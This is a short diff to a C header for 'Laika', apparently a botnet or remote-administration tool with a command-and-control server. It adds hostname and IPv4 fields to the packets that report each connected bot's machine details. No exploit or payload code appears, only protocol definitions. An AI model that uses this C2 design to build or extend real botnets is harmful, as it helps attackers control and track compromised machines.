@@ -6,6 +6,9 @@
 
 #define LAIKA_MAX_PKTSIZE 4096
 
+#define LAIKA_HOSTNAME_LEN 64
+#define LAIKA_IPV4_LEN 16
+
 /* NONCE: randomly generated uint8_t[LAIKA_NONCESIZE] */
 
 /* first handshake between peer & cnc works as so:
@@ -22,6 +25,8 @@ enum {
     *   uint8_t majorVer;
     *   uint8_t minorVer;
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- freshly generated pubKey to encrypt decrypted nonce with
+    *   char hostname[LAIKA_HOSTNAME_LEN];
+    *   char ipv4[LAIKA_IPV4_LEN];
     */
     LAIKAPKT_HANDSHAKE_RES,
     /* layout of LAIKAPKT_HANDSHAKE_RES:
@@ -34,8 +39,9 @@ enum {
     LAIKAPKT_AUTHENTICATED_ADD_PEER, /* notification that a peer has connected to the cnc */
     /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
+    *   char hostname[LAIKA_HOSTNAME_LEN];
+    *   char ipv4[LAIKA_IPV4_LEN];
     *   uint8_t peerType;
-    *   -- reserved info later (machine info including hostname, OS, machineType, ip, etc.)
     */
     LAIKAPKT_AUTHENTICATED_RMV_PEER, /* notification that a peer has disconnected from the cnc */
     /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER
